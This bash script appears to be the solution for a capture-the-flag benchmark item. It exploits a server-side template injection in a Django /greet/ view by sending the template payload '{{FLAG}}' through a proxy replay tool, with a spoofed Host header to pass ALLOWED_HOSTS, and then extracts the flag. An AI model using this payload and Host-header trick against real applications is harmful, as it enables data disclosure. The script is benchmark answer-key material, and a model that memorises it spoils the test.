#!/usr/bin/env bash
# XBEN-009-24 — SSTI in a Django template. Proxy-mode twin. The /greet/ view
# renders the `name` query parameter as a template, so `{{FLAG}}` resolves to
# the flag. The app's ALLOWED_HOSTS rejects the literal 127.0.0.1 the browser
# would send, so the request is replayed with a Host header it accepts.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben009p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/greet/' \
  --set 'header.host=localhost' --set 'query.name={{FLAG}}' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
